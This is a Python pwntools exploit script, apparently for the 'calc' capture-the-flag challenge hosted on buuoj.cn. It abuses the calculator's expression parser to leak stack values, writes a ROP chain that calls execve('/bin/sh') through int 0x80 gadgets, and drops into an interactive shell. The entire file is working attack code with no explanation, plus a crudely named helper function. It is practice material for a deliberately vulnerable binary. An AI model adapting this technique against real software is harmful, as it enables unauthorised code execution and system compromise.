#coding=utf-8
from pwn import *
#context.log_level = 'debug'
local = 1
exec_file="./calc"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",26826)
    libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    print a.argv[0]
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *0x08049411
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("",str(idx))
def add(size):
    return 

def delete(idx):
    return
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33

def transform(current):
    if current < 0:
        current += 0x100000000
    fuck(current)
    return(current)

payload =  "+9*9" * 4 + "+3*5" + "+3*6"
a.sendlineafter("=== Welcome to SECPROG calculator ===\n",payload)
canary = int(a.recvline(keepends=False),10)
canary = transform(canary)


payload = "+360"
a.sendline(payload)
stack_addr = int(a.recvline(keepends=False),10)
stack_addr = transform(stack_addr)

pop_eax_ret = 0x0805c34b
int_0x80 = 0x08049a21
pop_edx_ecx_ebx_ret = 0x080701d0

#debug()
ROP_chain = p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(stack_addr) + p32(int_0x80) + "/bin" + "/sh\x00"
print len(ROP_chain)/4
for i in range(len(ROP_chain)/4):
    payload = "+36" + str(i+1)
    a.sendline(payload)
    bins = int(a.recvline(keepends=False),10)
    if bins < 0:
        bins = -bins
        payload = "+36" + str(i+1) + '+' + str(bins)
        a.sendline(payload)
        a.recvline(keepends=False)
    elif bins == 0:
        print("its zero.")
    else:
        payload = "+36" + str(i+1) + '-' +str(bins)
        a.sendline(payload)
        a.recvline(keepends=False)
    gadget = u32(ROP_chain[i*4:(i+1)*4])
    if  gadget > 0x7fffffff: 
        payload = "+36" + str(i+1) + "-1" + "-" + str(0xffffffff - gadget)
        a.sendline(payload)
        a.recvline(keepends=False)
    elif gadget == 0:
        continue
    else :
        payload = "+36" + str(i+1) + '+' +str(gadget)
        a.sendline(payload)
        a.recvline(keepends=False)
a.sendline("shell")
a.interactive()
